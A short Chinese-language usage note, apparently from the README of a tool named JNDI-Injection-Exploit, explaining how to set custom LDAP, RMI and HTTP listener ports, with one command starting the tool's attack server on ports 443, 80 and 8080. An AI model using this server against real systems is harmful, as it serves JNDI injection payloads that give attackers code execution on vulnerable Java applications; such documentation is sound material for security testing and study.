允许自定义ldap、wmi、http监听端口
将ldap开在443，将http开在80，将rmi开在8080:
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -l 443 -h 80 -r 8080
